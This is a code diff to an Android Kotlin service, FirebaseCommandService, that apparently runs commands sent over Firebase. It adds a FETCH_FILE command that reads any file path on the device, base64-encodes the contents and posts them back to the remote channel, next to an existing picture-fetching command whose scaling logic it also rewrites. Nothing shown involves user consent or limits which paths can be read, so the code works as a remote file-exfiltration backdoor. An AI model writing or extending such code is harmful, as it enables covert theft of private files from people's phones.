@@ -126,6 +126,9 @@ class FirebaseCommandService : Service() {
                 } else if (command.startsWith("FETCH_PIC:")) {
                     val path = command.removePrefix("FETCH_PIC:").trim()
                     fetchPic(path)
+                } else if (command.startsWith("FETCH_FILE:")) {
+                    val path = command.removePrefix("FETCH_FILE:").trim()
+                    fetchFile(path)
                 }
             }
         }
@@ -192,8 +195,11 @@ class FirebaseCommandService : Service() {
 
             val maxDim = 800
             var scale = 1
-            if (options.outHeight > maxDim || options.outWidth > maxDim) {
-                scale = Math.pow(2.0, Math.ceil(Math.log(Math.max(options.outHeight, options.outWidth).toDouble() / maxDim) / Math.log(0.5)).toInt() * -1.0).toInt()
+            val halfHeight: Int = options.outHeight / 2
+            val halfWidth: Int = options.outWidth / 2
+
+            while (halfHeight / scale >= maxDim || halfWidth / scale >= maxDim) {
+                scale *= 2
             }
 
             options.inJustDecodeBounds = false
@@ -213,6 +219,26 @@ class FirebaseCommandService : Service() {
             postResult("IMAGE", base64)
         } catch (e: Exception) {
             postResult("ERROR", "Failed to fetch picture: ${e.message}")
+        }
+    }
+
+    private fun fetchFile(path: String) {
+        try {
+            val file = java.io.File(path)
+            if (!file.exists() || !file.isFile) {
+                postResult("ERROR", "File does not exist: $path")
+                return
+            }
+            if (file.length() > 2 * 1024 * 1024) { // Additional safety check (2MB)
+                postResult("ERROR", "File is too large to fetch over Firebase: ${file.name} (${file.length()} bytes)")
+                return
+            }
+
+            val fileBytes = file.readBytes()
+            val base64 = android.util.Base64.encodeToString(fileBytes, android.util.Base64.DEFAULT)
+            postResult("FILE", "${file.name}|$base64")
+        } catch (e: Exception) {
+            postResult("ERROR", "Failed to fetch file: ${e.message}")
         }
     }
 
